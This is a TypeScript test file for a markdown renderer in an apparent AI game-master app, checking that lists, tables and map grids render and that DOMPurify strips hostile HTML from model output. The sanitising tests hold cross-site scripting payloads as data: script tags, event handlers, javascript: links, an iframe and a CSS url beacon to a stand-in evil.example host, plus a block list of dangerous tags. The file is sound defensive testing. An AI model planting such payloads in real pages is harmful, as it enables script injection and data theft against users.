/**
 * The markdown pipeline, with a real DOM.
 *
 * Two things are being checked, and only one of them is cosmetic:
 *
 * 1. Lists survive. A hand-written transform shipped first and silently dropped them,
 *    so the first real session rendered five numbered questions as one run-together
 *    paragraph. That is what a library was brought in for.
 * 2. Script tags do not survive. The GM's output is data from a model, and a model can
 *    be asked for a script tag as easily as for a paragraph.
 */

import assert from "node:assert/strict";
import { before, describe, it } from "node:test";

import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";
import { marked } from "marked";

import { renderMarkdown, SANITISE_CONFIG } from "./markdown.ts";

let render: (markdown: string) => string;

before(() => {
	// DOMPurify needs a window. In a browser that is `window`; here jsdom supplies one.
	const purify = createDOMPurify(new JSDOM("").window as never);
	render = (markdown: string) => renderMarkdown(markdown, marked as never, purify as never);
});

describe("markdown the GM actually writes", () => {
	it("renders an ordered list as a list", () => {
		// The regression. The guidance tells the GM to ask five questions in one message.
		const html = render("Answer these:\n\n1. System?\n2. Tone?\n3. Level?");
		assert.match(html, /<ol>/);
		assert.equal((html.match(/<li>/g) ?? []).length, 3);
	});

	it("renders an unordered list, bold, and inline code", () => {
		const html = render("- **Hexblade** is from `XGE`\n- Paladin 2 / Warlock 1");
		assert.match(html, /<ul>/);
		assert.match(html, /<strong>Hexblade<\/strong>/);
		assert.match(html, /<code>XGE<\/code>/);
	});

	it("keeps a map grid intact in a fenced block", () => {
		// Rendering a dungeon as prose destroys it.
		const grid = "#####\n#...#\n#.T.#\n#####";
		const html = render("Here:\n\n```\n" + grid + "\n```");
		assert.match(html, /<pre>/);
		assert.ok(html.includes("#.T.#"), "the grid lost a row");
	});

	it("renders a table, which the guidance uses for printings", () => {
		const html = render("| System | Default |\n| --- | --- |\n| 5E | 2024 |");
		assert.match(html, /<table>/);
		assert.match(html, /<td>5E<\/td>/);
	});
});

describe("sanitising model output", () => {
	it("strips a script tag", () => {
		const html = render('Fine text\n\n<script>alert("xss")</script>');
		assert.doesNotMatch(html, /<script/i);
		assert.ok(html.includes("Fine text"), "stripping the script took the prose with it");
	});

	it("strips inline event handlers", () => {
		const html = render('<p onclick="alert(1)">click me</p>');
		assert.doesNotMatch(html, /onclick/i);
		assert.ok(html.includes("click me"));
	});

	it("strips a javascript: link but keeps an https one", () => {
		// Both are links as far as markdown is concerned; only one is executable.
		assert.doesNotMatch(render("[tap](javascript:alert(1))"), /javascript:/i);
		assert.doesNotMatch(render("[tap](data:text/html;base64,PHNjcmlwdD4=)"), /data:/i);

		const safe = render("[the SRD](https://example.com/srd)");
		assert.match(safe, /href="https:\/\/example\.com\/srd"/);
	});

	it("strips an iframe and an img with an onerror", () => {
		assert.doesNotMatch(render('<iframe src="https://evil.example"></iframe>'), /<iframe/i);
		assert.doesNotMatch(render('<img src=x onerror="alert(1)">'), /onerror/i);
	});

	it("strips style, which can exfiltrate through a background url", () => {
		const html = render('<style>body{background:url("https://evil.example/?c=1")}</style>ok');
		assert.doesNotMatch(html, /<style/i);
	});

	it("declares no dangerous tag in its own allow list", () => {
		// A guard on the policy itself, so widening it later cannot quietly readmit these.
		for (const tag of ["script", "iframe", "style", "object", "embed", "form", "input"]) {
			assert.ok(!SANITISE_CONFIG.ALLOWED_TAGS.includes(tag as never), `${tag} is allowed`);
		}
		for (const attr of ["onclick", "onerror", "onload", "style", "srcdoc"]) {
			assert.ok(!SANITISE_CONFIG.ALLOWED_ATTR.includes(attr as never), `${attr} is allowed`);
		}
	});
});
